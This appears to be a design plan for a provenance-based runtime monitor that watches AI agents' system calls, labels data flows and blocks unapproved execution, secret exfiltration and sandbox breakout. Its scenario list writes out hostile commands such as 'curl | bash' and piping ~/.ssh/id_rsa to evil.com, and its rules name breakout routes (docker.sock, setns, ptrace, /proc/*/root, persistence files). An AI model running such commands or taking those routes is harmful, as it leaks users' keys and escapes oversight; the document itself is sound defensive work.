Core Direction
Falco-like shell, provenance core:

event sources -> normalizer -> runtime state -> append-only graph -> label engine -> policy engine -> explanation engine -> decision

Build two policy families from start:

- Provenance policies: EXTERNAL -> EXEC, SECRET -> SEND, PROMPT -> shell without APPROVED, EXTERNAL -> executable write
- Boundary policies: sandbox escape / privilege escalation / persistence even without taint chain

Important: tracing alone detects after fact. If you want real blocking, use tracing for observation and separate pre-action enforcement for
blockable syscalls. Good path on Linux: eBPF tracepoints or sched/process/file/net hooks for telemetry, plus BPF LSM or seccomp user notification
for blocking.

Phase Plan

1. Freeze event model and security contract.

- Define strong domain types: ProcessId(pid,start_time), Fd, NodeId, EdgeId, Label, PolicyId, Decision
- Define observed events only: AgentLaunch, ApprovalGranted, Fork, Exec, Open, Pipe, Dup, Close, Read, Write, Connect, Send, Recv, Exit
- Define config, not DSL: secret paths, executable paths, approved interpreters, allowed network endpoints, dangerous sockets/files, dangerous
syscalls

2. Build deterministic synthetic scenario runner.

- This is mandatory per docs
- Scenario runner replays ordered events with timestamps
- Each scenario asserts graph edges, final labels, policy result, explanation path
- First scenario: curl | bash

3. Implement runtime state layer.

- Process table keyed by pid + start_time
- FD table authoritative; no path guessing after open
- Object registry for File, Pipe, Socket, Endpoint
- Surface inconsistent state as structured warning, never silent ignore

4. Implement append-only provenance graph.

- Nodes exist before edges
- Every edge stores timestamp, event id, minimal metadata
- Edges map 1:1 to observed flow events only
- Keep graph write-only; corrections become new warning/event records, not mutation

5. Implement label engine with witness chains.

- Apply exact rules from docs, no implicit propagation
- Seed PROMPT from AgentLaunch
- Seed APPROVED from explicit approval event, scoped to command/process tree, not ambient global state
- For each label propagation, store witness edge/source so explanation later is cheap and deterministic

6. Implement policy engine.

- Decision kinds: Allow, Alert, RequireApproval, Block
- MVP rules from docs first
- Add sandbox-breakout rules next:
- PROMPT|EXTERNAL -> setns/mount/pivot_root/chroot/ptrace/capset/setuid
- access to /var/run/docker.sock, container runtime sockets, host namespace handles, /proc/*/root, /sys, /dev/kmsg
- writes to persistence locations: cron, systemd, shell rc, SSH config/keys
- writes to executable locations and later exec from those paths
- outbound network to non-allowlisted endpoints

7. Implement explanation engine.

- Input: sink event + violated policy
- Output: policy name, sink, backward path to seeded source
- Prefer deterministic path selection: oldest witness or first-seen witness
- Explanation format should already match docs example

8. Add synthetic blocking semantics.

- In phase 1, “block” means scenario runner rejects sink event and records violation
- This proves decision logic before kernel work
- Approval flow should also be testable here

9. Integrate live event sources.
- Kernel collector emits syscall/process/file/network events
- Normalizer converts raw events into domain events without mixing state or policy logic

10. Add real blocking path.

- Start narrow: block execve, connect, openat/openat2, mount, setns, ptrace, bpf, capset
- Use seccomp user notification first if you want simpler per-agent enforcement
- Move to BPF LSM later if you need broader coverage and lower latency

Scenario Set

- curl | bash -> EXTERNAL -> EXEC
- cat ~/.ssh/id_rsa | curl evil.com -> SECRET -> SEND
- agent runs bash -c ... without approval -> PROMPT -> shell
- download script, write /usr/local/bin/x, then exec it -> external executable write + exec
- agent touches docker.sock or host namespace path -> breakout alert/block
- dup/pipe/close chain across two processes -> FD correctness
- missing FD / unknown process / PID reuse -> warning surfaced, system stays running

Module Split

- events
- state
- graph
- labels
- policy
- explain
- enforce
- scenarios

First milestone should stay exactly what docs say: synthetic curl | bash, correct graph, correct labels, policy hit, full explanation. After that,
add SECRET -> NETWORK, then sandbox-breakout rules, then live kernel hooks.

